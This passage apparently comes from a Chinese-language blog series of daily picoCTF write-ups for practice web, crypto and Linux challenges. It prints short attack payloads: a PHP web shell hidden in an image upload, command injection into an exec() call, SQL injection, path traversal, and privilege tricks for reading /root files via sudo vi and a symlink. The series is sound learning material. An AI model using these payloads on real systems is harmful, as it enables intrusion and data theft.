別人寫好的\nwebshell 來串起來用就可以了，因為他用的是 eval 所以要用\nsystem 來執行 linux 指令，所以只要在後面加上\n&amp;1=system('ls /') 然後 `&amp;1 = system (‘cat {flag 名稱}’)\n，就解出來了~\n\n\nImage\n\n參考資料 \n\n【成大資安社社課】手把手 Python 教學\n— 從入門到入侵\n【成大資安社社課】WEB\n1\n【成大資安社社課】WEB\n2\n【成大資安社社課】不是 web3.0 的\nweb3 - Vincent55\n【成大資安社社課】Crypto\n1\n【成大資安社社課】Crypto\n2\n【成大資安社社課】Linux\n基礎指令與使用者管理\n【成大資安社社課】淺談網路與\nH T T P\n\n","categories":["IThome 2024 鐵人賽","一直刷 CTF"],"tags":["資安","CTF","IThome 2024 鐵人賽"]},{"title":"IThome 2024 鐵人賽 一直刷 CTF - Day15","url":"/IThome_2024ironman_CTF_Day15/","content":"前言 \n本日進度：\n\n3 題 web + 3 題\ncrypto\n\n\nWriteup \n第一題：Search source \n查了一下發現，可以用 wget -mkEpnp http://example.org\n的指令把一整個網頁 mirror 下來，之後再用 grep 看有沒有\npicoctf 字樣就得到 Flag 了\n\n\nImage\n\n第二題：Some Assembly Required 1\n\n這題本來在看懂他程式碼理解了好久，結果後來隨便點點居然不小心就打開它\nAssembly 的檔案就得到 Flag 了 owo\n\n\nImage\n\n後來看別人的 writeup 是要把 ./JIFxzHyW8W\n載下來，然後逆向，但這樣得到的好像就是跟我一樣的東西而已 xdddd\n第三題：Some Assembly Required 2\n\n學上一題一樣，點開來之後滑到最下面就好像看到 Flag 了 … 嗎？\n\n\nImage\n\n喔不他好像被加密過了，但我又看不懂他的 WebAssembly\n，試了一段時間之後沒忍住直接跑去看別人 writeup 了😢 ，這題應該是要把它的\nwasm 反編譯之後去看裡面的邏輯，就會發現他是把內容跟 8 做 XOR 的結果\n\n\nImage\n\n(我是學 這篇)\n第四題：interencdec \n因為前一個禮拜有點忙都沒有上課，都只有寫題目，Web\n能寫的都快寫完了，先寫一些簡單的 crypto\n題目，剩的時間趕快趕課，不然都只是在熟練舊有的東西而已\n把它提供的檔案載下來，然後做兩次 base64 解碼，再用凱薩解密就可以得到\nFlag 了\n\n\nImage\n\n\n\nImage\n\n第五題：Mod 26 \n這題更簡單，他說適用 rot13 ，所以就能剛剛的凱薩解密改成偏移量 13\n就能得到結果了\n\n\nImage\n\n第六題： \n我們得到一張圖片\n\n\nImage\n\n用 mac 內建的 OCR 可以得到以下字串\n16 9 3 15 3 20 6 { 20 8 5 14 21 13 2 5 18 19 13 1 19 15 14 }\n感覺數字就是代表第幾個字母，簡單整理一下就能得到 Flag 了\n\n\nImage\n\n參考資料 \n\n【成大資安社社課】手把手 Python 教學\n— 從入門到入侵\n【成大資安社社課】WEB\n1\n【成大資安社社課】WEB\n2\n【成大資安社社課】不是 web3.0 的\nweb3 - Vincent55\n【成大資安社社課】Crypto\n1\n【成大資安社社課】Crypto\n2\n【成大資安社社課】Linux\n基礎指令與使用者管理\n【成大資安社社課】淺談網路與\nH T T P\n\n","categories":["IThome 2024 鐵人賽","一直刷 CTF"],"tags":["資安","CTF","IThome 2024 鐵人賽"]},{"title":"IThome 2024 鐵人賽 一直刷 CTF - Day14","url":"/IThome_2024ironman_CTF_Day14/","content":"前言 \n本日進度：\n\n6 題 web\n\n\nWriteup \n第一題：findme \n用他的密碼 test / test!\n登入，但這樣好像拿不到什麼，打開 Burp Suite 攔截\nrequest，發現有下面這兩個請求，有一個\n/next-page/id=cGljb0NURntwcm94aWVzX2Fs 試著把它用 Base64\n解碼，然後他會再跳轉一次，有另一個 id ，一樣用 Base64\n解碼之後合併再一起就得到 Flag 了\n\n\nImage\n\n\n\nImage\n\n第二題：Secrets \n點檢查發現 source 裡面有一個資料夾 secret ，所有就連過去看看\n(記得最後面要加 / 不然會被 redirect 到\nhttp://saturn.picoctf.net/secret/)\n，然後到下一個頁面後又發現有個資料夾 hidden ，連過去又有個資料夾\nsuperhidden ，再連過去之後就看到 Flag 了\n\n\nImage\n\n\n\nImage\n\n\n\nImage\n\n\n\nImage\n\n第三題：Roboto Sans \n這題看了好久才想到要去看 robots.txt ，裡面有一些看起來像\nbase64 編碼後過的東西，上下兩行不太知道是什麼，中間那行解出來是\njs/myfile.txt ，所以就去看 js/myfile.txt\n就得到 Flag 了\n\n\nImage\n\n\n\nImage\n\n\n\nImage\n\n第四題：Who are you? \n這題很好玩，他是昨天把 User-Agent 改成\npicobrowser\n的進階版，這次要改的東西更多，但他都有給提示，慢慢查一個個加到 Header\n裡面就完成了，分別是 User-Agent Referer\nDate DNT X-Forwarded-For\nAccept-Language ，這些都改成他想要的之後就能得到 Flag\n了\n\n\nImage\n\n\n\nImage\n\n\n\nImage\n\n\n\nImage\n\n\n\nImage\n\n\n\nImage\n\n\n\nImage\n\n\n\nImage\n\n第五題：It is my Birthday \n這題是要上傳兩個 PDF，要滿足內容不相同，但是 MD5 Hash\n相同，所以我先用 Burp Suite 把請求抓下來，然後上網找到兩個會碰撞的 MD5\nHash :\nTEXTCOLLBYfGiJUETHQ4hAcKSMd5zYpgqf1YRDhkmxHkhPWptrkoyz28wnI9V0aHeAuaKnak\n和\nTEXTCOLLBYfGiJUETHQ4hEcKSMd5zYpgqf1YRDhkmxHkhPWptrkoyz28wnI9V0aHeAuaKnak，並分別把他們當成\nPDF 的內容，上傳上去之後就能得到 Flag 了\nPOST /index.php HTTP/1.1Host: mercury.picoctf.net:57247Content-Length: 575Cache-Control: max-age=0Accept-Language: en-US,en;q=0.9Upgrade-Insecure-Requests: 1Origin: http://mercury.picoctf.net:57247Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryvOuQVRQUS71gBftBUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.120 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Referer: http://mercury.picoctf.net:57247/Accept-Encoding: gzip, deflate, brConnection: keep-alive------WebKitFormBoundaryvOuQVRQUS71gBftBContent-Disposition: form-data; name=\"file1\"; filename=\"test.pdf\"Content-Type: application/pdfTEXTCOLLBYfGiJUETHQ4hAcKSMd5zYpgqf1YRDhkmxHkhPWptrkoyz28wnI9V0aHeAuaKnak------WebKitFormBoundaryvOuQVRQUS71gBftBContent-Disposition: form-data; name=\"file2\"; filename=\"test.pdf\"Content-Type: application/pdfTEXTCOLLBYfGiJUETHQ4hEcKSMd5zYpgqf1YRDhkmxHkhPWptrkoyz28wnI9V0aHeAuaKnak------WebKitFormBoundaryvOuQVRQUS71gBftBContent-Disposition: form-data; name=\"submit\"Upload------WebKitFormBoundaryvOuQVRQUS71gBftB--\n\n\nImage\n\n\n\nImage\n\n第六題： \n網頁中的 js 被 obfuscation 了，有夠醜，先拿 prettier\n格式化，再仔細看看，感覺跟之前有一題 dont-use-client-side\n很像，但很多東西被打亂了，不過可以從\ncheckpass[_0x4b5b(\"0x2\")](, ) 判斷出密碼的順序是\n_0x4b5b(\"0x3\") -&gt; _0x4b5b(\"0x4\") -&gt;\n_0x4b5b(\"0x6\") -&gt;\n_0x4b5b(\"0x5\")，把它印出來之後就是 Flag 了～\nvar _0x5a46 = [  \"0a029}\",  \"_again_5\",  \"this\",  \"Password\\x20Verified\",  \"Incorrect\\x20password\",  \"getElementById\",  \"value\",  \"substring\",  \"picoCTF{\",  \"not_this\",];(function (_0x4bd822, _0x2bd6f7) {  var _0xb4bdb3 = function (_0x1d68f6) {    while (--_0x1d68f6) {      _0x4bd822[\"push\"](_0x4bd822[\"shift\"]());    }  };  _0xb4bdb3(++_0x2bd6f7);})(_0x5a46, 0x1b3);var _0x4b5b = function (_0x2d8f05, _0x4b81bb) {  _0x2d8f05 = _0x2d8f05 - 0x0;  var _0x4d74cb = _0x5a46[_0x2d8f05];  return _0x4d74cb;};function verify() {  checkpass = document[_0x4b5b(\"0x0\")](\"pass\")[_0x4b5b(\"0x1\")];  split = 0x4;  if (checkpass[_0x4b5b(\"0x2\")](0x0, split * 0x2) == _0x4b5b(\"0x3\")) {    if (checkpass[_0x4b5b(\"0x2\")](0x7, 0x9) == \"{n\") {      if (        checkpass[_0x4b5b(\"0x2\")](split * 0x2, split * 0x2 * 0x2) ==        _0x4b5b(\"0x4\")      ) {        if (checkpass[_0x4b5b(\"0x2\")](0x3, 0x6) == \"oCT\") {          if (            checkpass[_0x4b5b(\"0x2\")](split * 0x3 * 0x2, split * 0x4 * 0x2) ==            _0x4b5b(\"0x5\")          ) {            if (checkpass[\"substring\"](0x6, 0xb) == \"F{not\") {              if (                checkpass[_0x4b5b(\"0x2\")](                  split * 0x2 * 0x2,                  split * 0x3 * 0x2,                ) == _0x4b5b(\"0x6\")              ) {                if (checkpass[_0x4b5b(\"0x2\")](0xc, 0x10) == _0x4b5b(\"0x7\")) {                  alert(_0x4b5b(\"0x8\"));                }              }            }          }        }      }    }  } else {    alert(_0x4b5b(\"0x9\"));  }}\n\n\nImage\n\n參考資料 \n\n【成大資安社社課】手把手 Python 教學\n— 從入門到入侵\n【成大資安社社課】WEB\n1\n【成大資安社社課】WEB\n2\n【成大資安社社課】不是 web3.0 的\nweb3 - Vincent55\n【成大資安社社課】Crypto\n1\n【成大資安社社課】Crypto\n2\n【成大資安社社課】Linux\n基礎指令與使用者管理\n【成大資安社社課】淺談網路與\nH T T P\n\n","categories":["IThome 2024 鐵人賽","一直刷 CTF"],"tags":["資安","CTF","IThome 2024 鐵人賽"]},{"title":"IThome 2024 鐵人賽 一直刷 CTF - Day13","url":"/IThome_2024ironman_CTF_Day13/","content":"前言 \n本日進度：\n\n6 題 web\n\n\nWriteup \n第一題：picobrowser \n這題他提示我們說要用 picobrowser ，感覺就是要拿這個\nUser-Agent 來訪問，所以我就用 Burp Suite 來修改 User-Agent 變成\npicobrowser 然後重新導向之後再修改一次 User-Agent\n就可以看到 Flag 了\n\n\nImage\n\n\n\nImage\n\n\n\nImage\n\n\n\nImage\n\n第二題：Power Cookie \n就把 Cookie 的 isAdmin 改成 true\n就可以了\n\n\nImage\n\n\n\nImage\n\n\n\nImage\n\n第三題：Forbidden Paths \n題目這麼說的\n\nWe know that the website files live in /usr/share/nginx/html/ and the\nflag is at /flag.txt but the website is filtering absolute file paths.\nCan you get past the filter to read the flag?\n\n所以就用 ../../../../flag.txt 來繞過過濾器就成功得到\nFlag 了\n\n\nImage\n\n\n\nImage\n\n第四題：login \n看一下他的 JS\n(async () =&gt; {    await new Promise((e =&gt; window.addEventListener(\"load\", e))),    document.querySelector(\"form\").addEventListener(\"submit\", (e =&gt; {        e.preventDefault();        const r = {            u: \"input[name=username]\",            p: \"input[name=password]\"        }          , t = {};        for (const e in r)            t[e] = btoa(document.querySelector(r[e]).value).replace(/=/g, \"\");        return \"YWRtaW4\" !== t.u ? alert(\"Incorrect Username\") : \"cGljb0NURns1M3J2M3JfNTNydjNyXzUzcnYzcl81M3J2M3JfNTNydjNyfQ\" !== t.p ? alert(\"Incorrect Password\") : void alert(`Correct Password! Your flag is ${atob(t.p)}.`)    }    ))})();\n他會把帳號密碼都用 Base64\n編碼過之後再比對，那基本上也跟明文差不多，直接把它比對的 Base64\n解碼就可以了\n\n\nImage\n\n剛好密碼就是 Flag 可以直接交上去摟～\n第五題：caas \n他有提供 index.js\nconst express = require('express');const app = express();const { exec } = require('child_process');app.use(express.static('public'));app.get('/cowsay/:message', (req, res) =&gt; {  exec(`/usr/games/cowsay ${req.params.message}`, {timeout: 5000}, (error, stdout) =&gt; {    if (error) return res.status(500).end();    res.type('txt').send(stdout).end();  });});app.listen(3000, () =&gt; {  console.log('listening');});\n目標看起來應該是透過 exec() 來達到\nRCE，因為要先截斷前一個指令，所以我先讓他輸出 panda ，然後在後面加上\n;ls 就可以看到目錄了\n\n\nImage\n\n再把那個看起來很像 Flag 檔案印出來就是答案了\n\n\nImage\n\n第六題：MatchTheRegex \n想說輸輸看他原始碼裡面寫的註解，結果就對了？？？\n\n\nImage\n\n\n\nImage\n\n後來試了一下，發現他題目要的應該是輸入符合 ^p.....F\n的字串，所以不論是 p.....F 、 paaaaaF 或是\npicoCTF 都可以通過\n\n\nImage\n\n參考資料 \n\n【成大資安社社課】手把手 Python 教學\n— 從入門到入侵\n【成大資安社社課】WEB\n1\n【成大資安社社課】WEB\n2\n【成大資安社社課】不是 web3.0 的\nweb3 - Vincent55\n【成大資安社社課】Crypto\n1\n【成大資安社社課】Crypto\n2\n【成大資安社社課】Linux\n基礎指令與使用者管理\n【成大資安社社課】淺談網路與\nH T T P\n\n","categories":["IThome 2024 鐵人賽","一直刷 CTF"],"tags":["資安","CTF","IThome 2024 鐵人賽"]},{"title":"IThome 2024 鐵人賽 一直刷 CTF - Day12","url":"/IThome_2024ironman_CTF_Day12/","content":"前言 \n本日進度：\n\n6 題 web\n\n\nWriteup \n第一題：Insp3ct0r \n就檢查了之後去看 HTML / CSS / JS 就可以看到 Flag 了\n\n\nImage\n\n\n\nImage\n\n\n\nImage\n\n第二題：where are the robots \n\n\nImage\n\n\n\nImage\n\n第三題：IntroToBurp \n不知道怎麼做於是偷看了一下 Hint ，他說要去 “mangling the request”\n，所以我就一個個試試看把什麼用掉會成功，最後發現是修改發送 OTP\nRequest，將 otp= 改成其他的名稱就可以了 (例如說\nblabla=)\n\n\nImage\n\n\n\nImage\n\n\n\nImage\n\n第四題：GET aHEAD \n測試了一下 choose red 和 choose blue\n，發現兩個分別是做 GET 和 POST\n請求，看到題目說 GET aHEAD ，所以我就猜測是要用 HEAD\n請求，然後就成功了\n\n\nImage\n\n第五題：Trickster \nWeb 也進入 Medium 了，這題看起來就很像之前上 【成大資安社社課】WEB\n1 的練習題，先試著用同樣的方法把\n&lt;?php system($_GET['cmd']);?&gt; 放到上傳的檔案裡面去\n(因為是上傳一張 png 的圖片然後再去改 request 所以我只要保留第一行的 PNG\n不變，Magic Number 就會對應到)\n\n\nImage\n\n但傳完了之後不知道要去哪裡使用檔案，於是我到 /robots.txt\n看看哪些是被隱藏的，發現有兩個路徑 /instructions.txt 和\n/upload 我就一一連進去看了\n\n\nImage\n\n在 \\instructions.txt\n講了一些上傳檔案的規定，不過很剛好的我都有做到了\n\n\nImage\n\n/upload 進去之後發現他說 Forbidden\n，沒有權限瀏覽資源，所以感覺很可能我們上傳的檔案就是存在這個路徑底下，所以我馬上試試看\n/test.png.php?cmd=id\n\n\nImage\n\n成功得到 shell 了～ 但是找不到 Flag 所以我用了\nfind / -name \".txt\" 找找線索，試了幾個之後就找到 Flag\n了\n\n\nImage\n\n\n\nImage\n\n\n\nImage\n\n第六題：SQLiLite \n直接試 'OR 1=1 -- 就進去了，然後在 HTML 內就有 Flag\n了\n\n\nImage\n\n\n\nImage\n\n參考資料 \n\n【成大資安社社課】手把手 Python 教學\n— 從入門到入侵\n【成大資安社社課】WEB\n1\n【成大資安社社課】WEB\n2\n【成大資安社社課】不是 web3.0 的\nweb3 - Vincent55\n【成大資安社社課】Crypto\n1\n【成大資安社社課】Crypto\n2\n【成大資安社社課】Linux\n基礎指令與使用者管理\n【成大資安社社課】淺談網路與\nH T T P\n\n","categories":["IThome 2024 鐵人賽","一直刷 CTF"],"tags":["資安","CTF","IThome 2024 鐵人賽"]},{"title":"IThome 2024 鐵人賽 一直刷 CTF - Day11","url":"/IThome_2024ironman_CTF_Day11/","content":"前言 \n本日進度：\n\n6 題 web\n\n\n前言 \nWriteup \n第一題：Local Authority \n先隨便登登看\n\n\nImage\n\n然後看一下原始碼，發現他的檢查方式是直接明文比對，所以我就可以獲得他真實的帳號密碼\n\n\nImage\n\n用帳號密碼登入後就可以拿到 Flag 了\n\n\nImage\n\n第二題：Inspect HTML \n就真的只要檢查一下原始碼就可以看到 Flag 了\n\n\nImage\n\n第三題：Includes \n一樣用檢查，然後看 style.css 和 script.js\n把兩個的註解和再一起就是 Flag 了\n\n\nImage\n\n\n\nImage\n\n第四題：Scavenger Hunt \n先從 HTML 裡面找到第一個部分\n\n\nImage\n\n接下來在 CSS 看到第二部分\n\n\nImage\n\nJS 中提示說如何避免 Google index，所以就去看\nrobots.txt\n\n\nImage\n\n到了 /robots.txt 得到第三部分，並提示說他是用 Apache 的\nserver，應該要如何 Access 經過一番查找了解到了好像有個\n/.htaccess 是用來設定權限的，所以就去看看\n\n\nImage\n\n在 /.htaccess 果真找到了第四部分，並提到他使用 Mac\n做網站，而且還 Store 很多資料，看到這邊身為 Mac\n使用者的我馬上就知道他指的應該就是 .DS_Store\n了，所以就去看看\n\n\nImage\n\nBingo~ 到 /.DS_Store 就看到最終的 Flag 了\n\n\nImage\n\n第五題：dont-use-client-side \n用檢查之後發現裡面有一個內嵌的 JS\n一樣是用明文比對密碼，只是拆成好幾段，按順序拼回去之後就是答案了～\n\n\nImage\n\n第六題：logon \n隨便登入試試看，看看 Cookie 發現有個 admin\n的欄位，所以就把他改成 True 然後重新整理就可以看到 Flag\n了\n\n\nImage\n\n\n\nImage\n\n參考資料 \n\n【成大資安社社課】手把手 Python 教學\n— 從入門到入侵\n【成大資安社社課】WEB\n1\n【成大資安社社課】WEB\n2\n【成大資安社社課】不是 web3.0 的\nweb3 - Vincent55\n【成大資安社社課】Crypto\n1\n【成大資安社社課】Crypto\n2\n【成大資安社社課】Linux\n基礎指令與使用者管理\n【成大資安社社課】淺談網路與\nH T T P\n\n","categories":["IThome 2024 鐵人賽","一直刷 CTF"],"tags":["資安","CTF","IThome 2024 鐵人賽"]},{"title":"IThome 2024 鐵人賽 一直刷 CTF - Day10","url":"/IThome_2024ironman_CTF_Day10/","content":"前言 \n本日進度：\n\n3 題 general skills + 3\n題 web\n\n\nWriteup \n第一題：plumbing \n這題就用之前上課學到的技巧，使用 python 的 pwn\n模組去跟遠端伺服器溝通，看看內容有沒有 Flag\n格式的東西，如果有就傳回來。\nimport pwnio = pwn.remote(\"jupiter.challenges.picoctf.org\", 14291)while True:    try:        line = io.readline().decode()        if \"pico\" in line:            print(line)    except:        break\n\n\nImage\n\n第二題：Based \n這題他給我們 45\n秒的時間去解出他的問題，看起來應該是可以人工處理的，經過一次次的嘗試我知道了他有三個問題，第一題是要把二進制的數字用\nASCII 轉換成文字，第二題是要把八進制轉成文字，最後一題是要把用 hex\n表示的 ASCII decode\n出來，為此我個別準備了一行程式，方便快速運算，如下：\nprint(\"\".join(chr(int(i, 2)) for i in \"\".split(\" \")))print(\"\".join(chr(int(i, 8)) for i in \"\".split(\" \")))bytes.fromhex(\"\").decode()\n最後就拼手速就可以解出這題了\n\n\nImage\n\n第三題：mus1c \n拿之前用過的線上 rockstar 編譯器去編譯這段程式碼，就可以得到一串編碼\n114 114 114 111 99 107 110 114 110 48 49 49 51 114 ，然後用\nASCII 編碼轉成文字就是答案了\n\n\nImage\n\nprint(\"\".join(chr(int(i)) for i in \"114 114 114 111 99 107 110 114 110 48 49 49 51 114\".split(\" \")))\n耶～ General Skill 都解完了\n第四題：WebDecode \n到他給的頁面裡面亂點然後開檢查，發現裡面有一個神奇的亂碼，拿去用\nbase64 decode 看看，就是 Flag 了\n\n\nImage\n\n第五題：Unminify \n點進網站裡，然後把裡面的 HTML 點開來看就能找到了 Flag 了\n\n\nImage\n\n第六題：Bookmarklet \n把它提供的 JS 放到 Console 裡面執行就會跳 Flag 的 alert 了\n\n\nImage\n\n參考資料 \n\n【成大資安社社課】手把手 Python 教學\n— 從入門到入侵\n【成大資安社社課】WEB\n1\n【成大資安社社課】WEB\n2\n【成大資安社社課】不是 web3.0 的\nweb3 - Vincent55\n【成大資安社社課】Crypto\n1\n【成大資安社社課】Crypto\n2\n【成大資安社社課】Linux\n基礎指令與使用者管理\n【成大資安社社課】淺談網路與\nH T T P\n\n","categories":["IThome 2024 鐵人賽","一直刷 CTF"],"tags":["資安","CTF","IThome 2024 鐵人賽"]},{"title":"IThome 2024 鐵人賽 一直刷 CTF - Day9","url":"/IThome_2024ironman_CTF_Day9/","content":"前言 \n本日進度：\n\n6 題 general\nskills\n\n\nWriteup \n第一題：Serpentine \n看到他 python code 裡面有個函數叫做 print_flag()\n，我就把它移動到 if __name__ == '__main__':\n下面，然後執行就得到 Flag 了\n\n\nImage\n\n第二題：PW Crack 5 \n因為懶得改太多程式，想說創一個通道讓dictionary.txt的資料自己一個個拿去測試，就是cat dictionary.txt|python level5.py，但原本的level.py只會執行一次，所以我就把其中的level_5_pw_check()改成以下這樣，就得到\nFlag 了\ndef level_5_pw_check():    while 1:        user_pw = input(\"Please enter correct password for flag: \")        user_pw_hash = hash_pw(user_pw)        if( user_pw_hash == correct_pw_hash ):            print(\"Welcome back... your flag, user:\")            decryption = str_xor(flag_enc.decode(), user_pw)            print(decryption)            return        print(\"That password is incorrect\")\n\n\nImage\n\n第三題：PW Crack 4 \n跟上一題很像，但這個比較好心把可能的密碼些在陣列裡面，所以我就直接改成以下這樣，就得到\nFlag 了\ndef level_4_pw_check(user_pw):    # user_pw = input(\"Please enter correct password for flag: \")    user_pw_hash = hash_pw(user_pw)    if( user_pw_hash == correct_pw_hash ):        print(\"Welcome back... your flag, user:\")        decryption = str_xor(flag_enc.decode(), user_pw)        print(decryption)        return 1    print(\"That password is incorrect\")pos_pw_list = [ ... ] # Put possible passwords herefor pw in pos_pw_list:    if level_4_pw_check(pw):        break\n\n\nImage\n\n第四題：PW Crack 3 \n這題跟前一題一樣是把答案寫在陣列裡面，但他只有七個，所以可以一個個慢慢試，就得到\nFlag 了 (結果我就真的試了七次才猜倒也是很不容易 xddddd)\n\n\nImage\n\n第五題：1_wanna_b3_a_r0ck5tar \n這題很神奇，他是用一個 Rockstar\n的程式語言寫的，懶得看文件先隨便先猜了一下，裡面有 IF 和\nElse，我就先試試看把他們刪掉，變成以下這樣執行，隨便亂輸入，就得到幾個數字，把他轉換成\nASCII 就得到 Flag 了~\nRocknroll is right              Silence is wrong                A guitar is a six-string        Tommy's been down               Music is a billboard-burning razzmatazz!Listen to the music                            Say \"Keep on rocking!\"                Listen to the rhythmTommy is rockin guitarShout Tommy!                    Music is amazing sensation Jamming is awesome presenceScream Music!                   Scream Jamming!                 Tommy is playing rock           Scream Tommy!       They are dazzled audiences                  Shout it!Rock is electric heaven                     Scream it!Tommy is jukebox god            Say it!                                     Break it downShout \"Bring on the rock!\"\n\n\nImage\n\n後來去看別人 writeup\n又去看了一下他的文件發現他是拿文字長度當每一位數字，題目本來應該是要我們去看懂他程式然後輸入進去啦，不過反正能拿到\nFlag 都是好方法🫠\n第六題：flag_shop \n這題我蠻喜歡的，他用 nc\n連到伺服器，然後要到他的商店裏面買 Flag，但是 Flag\n的價錢遠超過自己的資產。不過還好她有提供 source code\n可以參考，看了之後發現他有擋掉買負數的 Flag，但是但是，他沒有擋掉\ntotal_price 是負數，可能一般人會想說 Flag 數量是正的，那\ntotal_price = 900 * number_flags\n也是正的，但是打過競程的一定都知道 overflow ，只要把 Flag 數量設成\n(2^31 / 900, 2^31-1] ，就可以得到負數的 total_price\n了，藉由買負數價錢的東西，就可以增加自己的資產然後買 Flag 了~\n\n\nImage\n\n參考資料 \n\n【成大資安社社課】手把手 Python 教學\n— 從入門到入侵\n【成大資安社社課】WEB\n1\n【成大資安社社課】WEB\n2\n【成大資安社社課】不是 web3.0 的\nweb3 - Vincent55\n【成大資安社社課】Crypto\n1\n【成大資安社社課】Crypto\n2\n【成大資安社社課】Linux\n基礎指令與使用者管理\n【成大資安社社課】淺談網路與\nH T T P\n\n","categories":["IThome 2024 鐵人賽","一直刷 CTF"],"tags":["資安","CTF","IThome 2024 鐵人賽"]},{"title":"IThome 2024 鐵人賽 一直刷 CTF - Day8","url":"/IThome_2024ironman_CTF_Day8/","content":"前言 \n本日進度：\n\n6 題 general\nskills\n\n\nWriteup \n第一題：ASCII Numbers \n這題就是要把 ASCII 碼轉換成文字，我寫了個簡單的程式\n\n\nImage\n\n第二題：useless \n利用 ssh 連線進去，然後執行裡面的 useless\n檔案，他說要先看 code ，然後看到底下說要 Read the manual\n，所以就執行 man useless ，然後就看到 flag 了\n\n\nImage\n\n\n\nImage\n\n第三題：Specialer \n試了一些指令，按兩次 tab 就可以有哪些指令可以用，然後接著用\ncd 和 tab 測試各個資料夾，然後用\necho 的方式把內容輸出，最後就找到\n~/ala/kazam.txt 印出來是 flag\n\n\nImage\n\n\n\nImage\n\n\n\nImage\n\n第四題：Special \n發現他好像只會把把前面幾個字變很奇怪而已，像是這樣\naaaaaaaa;ls 後面的 ls 就能正常執行，所以用類似\naaaaaaaaa;ls 的方式就可以執行了，然後看到底下有個資料夾叫做\nblargh ，所以我試著 cd\n過去，但似乎他程式還會自動把 blargh 變成\nlarge，不過在後面接上 / 或是 ;\n就又可以了 ，結果他好像每次執行完程式就會自己回到 ~\n，所以要用 cd blargh/;ls 的方式，就看到 flag.txt，最後就用\ncd blargh/;cat flag.txt 就看到 flag 了\n\n\nImage\n\n第五題：Permissions \n因為進不去 \\root\\ ，試著用 sudo\n看看，還是不行，用 sudo -l 看有哪些指令可以用，發現可以用\nvi 是可以用的，所以我就直接 sudo vi /root\n，可以瀏覽裡面檔案，就找到 flag 了\n\n\nImage\n\n\n\nImage\n\n\n\nImage\n\n第六題：chrono \n我拿題目問了一下 ChatGPT\n\n\nImage\n\n但我發現他上面沒有任何編輯器，所以我就手動把他 cat 出來，就是 flag\n摟~\n\n\nImage\n\n參考資料 \n\n【成大資安社社課】手把手 Python 教學\n— 從入門到入侵\n【成大資安社社課】WEB\n1\n【成大資安社社課】WEB\n2\n【成大資安社社課】不是 web3.0 的\nweb3 - Vincent55\n【成大資安社社課】Crypto\n1\n【成大資安社社課】Crypto\n2\n【成大資安社社課】Linux\n基礎指令與使用者管理\n【成大資安社社課】淺談網路與\nH T T P\n\n","categories":["IThome 2024 鐵人賽","一直刷 CTF"],"tags":["資安","CTF","IThome 2024 鐵人賽"]},{"title":"IThome 2024 鐵人賽 一直刷 CTF - Day7","url":"/IThome_2024ironman_CTF_Day7/","content":"前言 \n本日進度：\n\n6 題 general\nskills\n【成大資安社社課】WEB\n2 - 到 LFI\n\n\nWriteup \n第一題：Warmed Up \n0x3D 轉成 10 進位，這樣就是答案了\n第二題：strings it \n就是要會用 strings 指令，把 binary 檔可讀的東西提出來，然後把\npicoCTF 樣式找出來就有了\nstrings strings | grep pico  \n\n\nImage\n\n第三題：what’s a net cat? \n按照指示把 nc 到他給的網址，然後就會得到 Flag 了\nnc jupiter.challenges.picoctf.org 25103 \n\n\nImage\n\n第四題：Lets Warm Up \n0x70 轉成文字，這樣就是答案了\n第五題：dont-you-love-banners \n進入 medium 了!\n這題真的比較難，使用第一個 server 取得密碼\n\n\nImage\n\n接下來連到第二個\nserver，然後用剛剛的密碼登入後，他會問一些問題，就網路查一下就有了\n\n\nImage\n\n接下來看一下他題目說的，flag 在 root 下面，但我們 cd\n過去之後卻發現沒有 read 的權限\n\n\nImage\n\n但有個就坐 /script.py\n的東西，是可以讀的，看了一下內容\nimport osimport ptyincorrect_ans_reply = \"Lol, good try, try again and good luck\\n\"if __name__ == \"__main__\":    try:      with open(\"/home/player/banner\", \"r\") as f:        print(f.read())    except:      print(\"*********************************************\")      print(\"***************DEFAULT BANNER****************\")      print(\"*Please supply banner in /home/player/banner*\")      print(\"*********************************************\")try:    request = input(\"what is the password? \\n\").upper()    while request:        if request == 'MY_PASSW@RD_@1234':            text = input(\"What is the top cyber security conference in the world?\\n\").upper()            if text == 'DEFCON' or text == 'DEF CON':                output = input(                    \"the first hacker ever was known for phreaking(making free phone calls), who was it?\\n\").upper()                if output == 'JOHN DRAPER' or output == 'JOHN THOMAS DRAPER' or output == 'JOHN' or output== 'DRAPER':                    scmd = 'su - player'                    pty.spawn(scmd.split(' '))                else:                    print(incorrect_ans_reply)            else:                print(incorrect_ans_reply)        else:            print(incorrect_ans_reply)            breakexcept:    KeyboardInterrupt\n本來想說可以直接修改 /script.py 讓他列印\nflag 但發現他有鎖 write\n的權限，就遇到一點困難了，於是我點下了邪惡 Hint\n\nDo you know about symlinks?\n\n去查了一下才知道這題應該是要我們去建造” 軟連結”，它跟硬連結的差異在於因為他只是單純的指向原本的檔案，不需要讀取的權限，所以就把\n/root/flag.txt 連結到\n/home/player/banner，這樣就應該就能讀到 Flag 了\nln -s /root/flag.txt /home/player/banner\n然後按下 Ctrl + C 之後再連一次就能看到 Flag 了\n\n\nImage\n\n第六題：SansAlpha \n規定終端不能使用任何字母，這我隨便猜 */* 找到\nflag 位置之後就不知道要怎麼做了 qaq，於是我去找了別人的\nWriteup\n\n\nImage\n\n看到有人是找到了 base64 的位置 /bin/base64，然後讓他把\nFlag 的內容 base64 一次，之後再自己 decode 回來\n但這邊要注意的是如果直接用 /???/????64 會跟\n/bin/x86_64 混淆，所以要用 /*/???[!_]64\n這樣才能找到正確的位置\n\n\nImage\n\n\n\nImage\n\n\n\nImage\n\n參考資料 \n\n【成大資安社社課】手把手 Python 教學\n— 從入門到入侵\n【成大資安社社課】WEB\n1\n【成大資安社社課】WEB\n2\n【成大資安社社課】不是 web3.0 的\nweb3 - Vincent55\n【成大資安社社課】Crypto\n1\n【成大資安社社課】Crypto\n2\n【成大資安社社課】Linux\n基礎指令與使用者管理\n【成大資安社社課】淺談網路與\nH T T P\n\n","categories":["IThome 2024 鐵人賽","一直刷 CTF"],"tags":["資安","CTF","IThome 2024 鐵人賽"]},{"title":"IThome 2024 鐵人賽 一直刷 CTF - Day6","url":"/IThome_2024ironman_CTF_Day6/","content":"前言 \n本日進度：\n\n6 題 general\nskills\n【成大資安社社課】WEB\n1 - 到 Lab - 看完\n\n\nWriteup \n第一題：Static ain’t always\nnoise \n利用 ltdis.sh 分解 static 